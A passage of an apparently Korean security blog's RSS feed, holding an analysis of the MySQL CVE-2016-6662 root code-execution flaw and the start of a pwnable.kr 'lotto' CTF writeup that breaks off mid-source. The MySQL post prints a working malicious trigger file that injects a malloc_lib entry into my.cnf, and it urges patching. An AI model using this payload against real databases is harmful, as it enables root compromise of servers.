&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;#include &amp;lt;linux/cred.h&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[MySQL Exploit Remote Root Code Execution CVE-2016-6662]]></title><description><![CDATA[CVE-2016-6662로 발표된 MySQL 취약점이 발표된지 오래되었지만, 제 나름대로 해석한 내용을 써보려 합니다. 우선 원문을 참조하실 분은 링크를 참조해 주시길 바랍니다. 이 취약점의 원리를 간단하게 말하자면, SQL…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 25 Sep 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;CVE-2016-6662로 발표된 MySQL 취약점이 발표된지 오래되었지만, 제 나름대로 해석한 내용을 써보려 합니다.&lt;/p&gt;
&lt;p&gt;우선 원문을 참조하실 분은 &lt;a href=&quot;http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html&quot;&gt;링크&lt;/a&gt;를 참조해 주시길 바랍니다.&lt;/p&gt;
&lt;p&gt;이 취약점의 원리를 간단하게 말하자면, SQL 명령을 통하여 &lt;code class=&quot;language-text&quot;&gt;my.cnf&lt;/code&gt;라는 설정 파일에 악의적인 값을 넣어 root권한을 획득하게 됩니다. 악의적인 설정값으로 &lt;code class=&quot;language-text&quot;&gt;malloc_lib&lt;/code&gt;라는 옵션이 있는데, 이 옵션은 malloc을 위한 라이브러리를 기본 제공하는 라이브러리가 아닌 다른 라이브러리를 로드하기 위해 있는 설정 값입니다.&lt;/p&gt;
&lt;p&gt;이 옵션을 malloc을 위한 라이브러리가 아닌, 악의적인 명령을 하게되는 라이브러리를 호출하게 한 후, 그 라이브러리에서 root shell을 열어주는 방식으로 구성되어있습니다.&lt;/p&gt;
&lt;p&gt;현재에는 MySQL, MariaDB, PerconaDB사에서 패치가 완료된 상황으로, 현재 MySQL은 패키지 관리자를 통할 경우 아직 업데이트 되지 않은 것 같습니다.&lt;/p&gt;
&lt;p&gt;제가 모든 환경에서 해본것이 아닌 만큼, 확실하지 않으며, 꼭 최신버전으로 &lt;strong&gt;&lt;code class=&quot;language-text&quot;&gt;업데이트&lt;/code&gt;&lt;/strong&gt;를 해주시길 바랍니다.&lt;/p&gt;
&lt;p&gt;또한 웹에서 &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt;계정으로 DB를 사용하는 경우도 있는데, 이 경우에는 권한이 모두 있으므로 일반 유저를 만들어 사용하길 바랍니다.&lt;/p&gt;
&lt;p&gt;패치가 되지 않은 버전의 MySQL로 분석을 해보도록 하겠습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;OS : Debian GNU/Linux 8
MySQL : mysql-server/stable,stable,now 5.5.50-0+deb8u1 all [installed]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이러한 환경에서 분석을 하였습니다. 원문을 읽고 exploit 코드를 참고하여 공격 원리를 파악하는 방식으로 분석하였습니다.&lt;/p&gt;
&lt;p&gt;공격은 다음과 같은 조건을 가진 상태에서 이루어 지게 됩니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;MySQL  &amp;lt;= 5.7.14 or 5.6.32 or 5.5.51
DB권한 =&gt; FILE, SELECT, INSERT, CREATE
DB에 명령을 내릴 수 있는 상황(ex SQL Injection, DB Connection...)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이와 같은 조건을 가진 환경에서 이루어 지게 됩니다. &lt;code class=&quot;language-text&quot;&gt;FILE&lt;/code&gt;권한 같은 경우는 일반적인 환경에서는 가지고 있지 않으므로, 이 조건을 우회하려면 &lt;code class=&quot;language-text&quot;&gt;CVE-2016-6663&lt;/code&gt;을 이용해야 합니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sql&quot;&gt;&lt;pre class=&quot;language-sql&quot;&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;show&lt;/span&gt; grants &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; attacker&lt;span class=&quot;token variable&quot;&gt;@&apos;%&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;--------------------------------------------------------------------------------------------------------+&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; Grants &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; attacker@&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;                                                                                  &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;--------------------------------------------------------------------------------------------------------+&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;GRANT&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;TO&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;attacker&apos;&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;@&apos;%&apos;&lt;/span&gt; IDENTIFIED &lt;span class=&quot;token keyword&quot;&gt;BY&lt;/span&gt; PASSWORD &lt;span class=&quot;token string&quot;&gt;&apos;*0CB5F227B3E98395CA0C6F1427427E77ADF49F89&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;GRANT&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;SELECT&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;INSERT&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;token identifier&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;`&lt;/span&gt;pocdb&lt;span class=&quot;token punctuation&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;TO&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;attacker&apos;&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;@&apos;%&apos;&lt;/span&gt;                                            &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;--------------------------------------------------------------------------------------------------------+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이와 같은 권한을 가진 DB 유저가 있는 상황입니다. 이 유저의 계정을 이용하여 공격을 할 수 있게 됩니다.&lt;/p&gt;
&lt;p&gt;이 계정은 &lt;code class=&quot;language-text&quot;&gt;FILE&lt;/code&gt;권한이 있기 때문에, &lt;code class=&quot;language-text&quot;&gt;DUMPFILE&lt;/code&gt;명령을 이용하여 mysql권한을 가진 공간에 파일을 쓸 수 있다.&lt;/p&gt;
&lt;p&gt;공격 대상의 디렉토리는 디폴트로 설정된 경우 &lt;code class=&quot;language-text&quot;&gt;/var/lib/mysql/&lt;/code&gt;이다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@debian:/var/lib/mysql&lt;span class=&quot;token comment&quot;&gt;# ls -ald&lt;/span&gt;
drwx------ &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt; mysql mysql &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; Oct  &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;21&lt;/span&gt;:23 &lt;span class=&quot;token builtin class-name&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;다음과 같이 이 디렉토리의 권한은 mysql이다. 이렇기 때문에 이 디렉토리에는 &lt;code class=&quot;language-text&quot;&gt;DUMPFILE&lt;/code&gt;명령을 통하여 파일을 만들 수 있게 된다.&lt;/p&gt;
&lt;p&gt;만들 파일은 &lt;code class=&quot;language-text&quot;&gt;my.cnf&lt;/code&gt;가 되는데, 이는 mysql이 시작 될 때 읽게되는 설정파일이기 때문이다. 이 파일이 아니더라도,&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;root@debian:/etc/mysql&lt;span class=&quot;token comment&quot;&gt;# ls -al my.cnf&lt;/span&gt;
-rw-r--r-- &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; mysql mysql &lt;span class=&quot;token number&quot;&gt;3350&lt;/span&gt; Sep &lt;span class=&quot;token number&quot;&gt;29&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;13&lt;/span&gt;:34 my.cnf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 파일(&lt;code class=&quot;language-text&quot;&gt;/etc/my.cnf.d/my.cnf&lt;/code&gt;도 포함)도 대상이 되게 되는데, 이 파일의 권한이 디폴트로 &lt;code class=&quot;language-text&quot;&gt;mysql&lt;/code&gt;임을 볼 수 있다. 이 때문에 이 파일에 값을 쓸 수 있게 된다.&lt;/p&gt;
&lt;p&gt;그럼 이 파일에 어떠한 값을 넣어야 하는지 알아야 하는데, 앞서 말한데로 &lt;code class=&quot;language-text&quot;&gt;malloc_lib&lt;/code&gt;를 이용할 것이기 때문에 그 옵션과 관련된 내용을 넣도록 하겠다.&lt;/p&gt;
&lt;p&gt;넣는 방식은 DUMFILE을 사용하면 좋겠지만, 이 방식은 2003년에 나온 취약점에 의해 막힌것 같다.&lt;/p&gt;
&lt;p&gt;그렇기 때문에 다른 방법을 사용해야 하는데, 그 방법은 &lt;code class=&quot;language-text&quot;&gt;log&lt;/code&gt;파일을 이용하여 작성하는 것이다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;my.cnf&lt;/code&gt;파일 마지막에 log를 이용하여 값을 인젝션시키고, 악의적인 라이브러리를 호출해 root shell을 획득하면 된다.&lt;/p&gt;
&lt;p&gt;하지만 log파일을 관리하는건 root의 권한만 가능하므로 이를 우회할 방법이 필요하다.&lt;/p&gt;
&lt;p&gt;그래서 사용된 것이 &lt;code class=&quot;language-text&quot;&gt;trigger&lt;/code&gt;이다. trigger를 root의 권한으로 실행시키게 하면 일반 유저도 root의 권한으로 명령이 가능하게 된다.&lt;/p&gt;
&lt;p&gt;여기서 문제는 일반 유저는 root의 trigger를 만들수 없다. 그래서 FILE옵션이 필요하게 된 것이다.&lt;/p&gt;
&lt;p&gt;이 권한을 이용하여 자신의 db에 trigger파일을 직접 &lt;strong&gt;업로드&lt;/strong&gt; 시켜버리면 된다.&lt;/p&gt;
&lt;p&gt;그렇게 업로드된 &lt;code class=&quot;language-text&quot;&gt;trigger&lt;/code&gt;에 의해서 root는 해당 명령을 실행하게 된다. 그러면 공격자는 일반 유저이지만, db에서는 root의 권한을 이용할 수 있다.&lt;/p&gt;
&lt;p&gt;이 root의 권한을 이용하여 &lt;code class=&quot;language-text&quot;&gt;log&lt;/code&gt;를 이용한 설정파일 인젝션을 수행하게 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sql&quot;&gt;&lt;pre class=&quot;language-sql&quot;&gt;&lt;code class=&quot;language-sql&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;TYPE&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;TRIGGERS
triggers&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf\nAFTER INSERT\n   ON `poctable` FOR EACH ROW\nBEGIN\n\n   DECLARE void varchar(550);\n   set global general_log_file=\&apos;/etc/mysql/my.cnf\&apos;;\n   set global general_log = on;\n   select &quot;\n\n# 0ldSQL_MySQL_RCE_exploit got here :)\n\n[mysqld]\nmalloc_lib=\&apos;/var/lib/mysql/mysql_hookandroot_lib.so\&apos;\n\n[abyss]\n&quot; INTO void;   \n   set global general_log = off;\n\nEND&apos;&lt;/span&gt;
sql_modes&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;
definers&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;root@localhost&apos;&lt;/span&gt;
client_cs_names&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;utf8&apos;&lt;/span&gt;
connection_cl_names&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;utf8_general_ci&apos;&lt;/span&gt;
db_cl_names&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;latin1_swedish_ci&apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;위와 같은 트리거를 생성하여 poctable에서 명령이 일어날 경우 root가 로그를 만들고, 인젝션하는 공격을 하게 된다.&lt;/p&gt;
&lt;p&gt;이렇게 되면 FILE권한만 있으면 root로 어떠한 명령이든 실행할 수 있게 된다.&lt;/p&gt;
&lt;p&gt;그럼 악의적인 라이브러리를 업로드 해야 하는데, 이는 단순하게 FILE권한이 있으므로 LIB를 HEX로 읽어 HEX로 써주면 된다.&lt;/p&gt;
&lt;p&gt;그렇게 올려진 라이브러리를 malloc&lt;em&gt;lib의 값으로 주면 mysql이 재시작 될 때 `malloc&lt;/em&gt;lib`옵션에 의해서 로드되고, 이 악의적인 라이브러리에서 기존에 사용하는 함수를 재정의해서 원하는 명령을 수행하도록 하면 된다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;5.5.52&lt;/code&gt; 패치노트를 기준으로 이 취약점이 다음과 같이 수정되었다.&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;--malloc_lib&lt;/code&gt;옵션은 일반적인 경로가 아닌, 라이브러리가 있는 경로에서만 로드되도록 하고, 설정파일에서는 이 옵션을 &lt;strong&gt;사용할 수 없게&lt;/strong&gt; 하였다.&lt;/p&gt;
&lt;p&gt;오직 mysql을 &lt;strong&gt;실행&lt;/strong&gt;할 때 옵션으로만 줄 수 있게 변경되었다.&lt;/p&gt;
&lt;p&gt;log파일은 &lt;code class=&quot;language-text&quot;&gt;.ini&lt;/code&gt;이나 &lt;code class=&quot;language-text&quot;&gt;.cnf&lt;/code&gt;파일인 설정파일에 쓸 수 없게 변경하였다. 이로써 설정파일에 악의적인 값을 인젝션할 수 없게 되었다.&lt;/p&gt;
&lt;p&gt;마지막으로 자세히는 나오지 않았지만, &lt;code class=&quot;language-text&quot;&gt;REPAIR TABLE&lt;/code&gt; 이 수정되었는데, 이는 &lt;code class=&quot;language-text&quot;&gt;CVE-2016-6663&lt;/code&gt;의 취약점을 수정한 것이다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Pwnable.kr lotto]]></title><description><![CDATA[다음과 같이 문제가 있다. 문제가 되게 길다. 여기서 봐야될건 함수를 보면 된다. play는 사용자로부터 6자리를 받고, 랜덤한 값…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 11 Sep 2016 00:00:00 GMT</pubDate><content:encoded>&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Mommy! I made a lotto program for my homework.
do you want to play?

ssh lotto@pwnable.kr -p2222 (pw:guest)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;다음과 같이 문제가 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;lotto@ubuntu&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;~&lt;/span&gt;$ cat lotto&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;c
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;string.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;fcntl.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; submit&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;play&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Submit your 6 lotto bytes : &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    r &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; submit&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Lotto Start!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;//sleep(1);&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// generate lotto numbers&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; fd &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/dev/urandom&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; O_RDONLY&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;fd&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;error. tell admin\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; lotto&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;fd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; lotto&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;error2. tell admin\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        lotto&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lotto&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;// 1 ~ 45&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;fd&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// calculate lotto score&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; match &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
